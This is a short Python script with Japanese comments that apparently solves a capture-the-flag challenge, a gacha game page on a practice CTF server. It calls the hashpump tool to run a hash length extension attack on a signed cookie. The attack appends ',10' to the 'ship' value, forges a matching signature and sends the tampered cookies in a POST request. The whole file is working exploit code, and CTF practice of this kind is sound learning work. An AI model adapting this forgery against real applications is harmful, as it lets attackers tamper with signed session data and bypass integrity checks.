import urllib.request
import subprocess 

#ブラウザで下記URLにアクセスし、ボタン"Gacha"をクリック。
#Cookieにあるsignatureとshipをし、以下のように設定する
url = "http://ctfq.sweetduet.info:10080/~q31/kangacha.php"
signature = "6306e2e1dccbb5bb38b37d8858d06515c430d6a9bba9e6d07194daf8173efbce85c03ea1a926577e90e350ef3d99f3cba0c879dcd16cfe78221c6ee5861fc86a"
ship = "1,1"
add_data = ",10"
a = []

#ツール"hashpump"を用いて、「,10」を加えたハッシュ値を算出
hashpump =subprocess.check_output('hashpump -s 46cfa1040c0379d1cfe2e496adece7e1c89b1c686703df0afdd25ae3d3a7973dc8618f94ec78b182a9ca7b59bd91ef5776635e5d112b4bf3316ed60e566c08b1 -d '+ship+' -k 21 -a ,10', shell=True)
a = hashpump.decode("utf-8").split("\n")

#そのまま送ると、「\x00」は「\x」は文字として解釈される。「\x」は16進数を表記に使われている。
ship2 = a[1].replace("\\x","%")

headers={"Cookie": "signature="+a[0]+"; "+ "ship="+ship2 }
data="submit=Gacha"
req = urllib.request.Request(url=url ,headers=headers, data=data.encode('utf-8'))
f = urllib.request.urlopen(req)
print(f.read().decode('utf-8'))
           
        
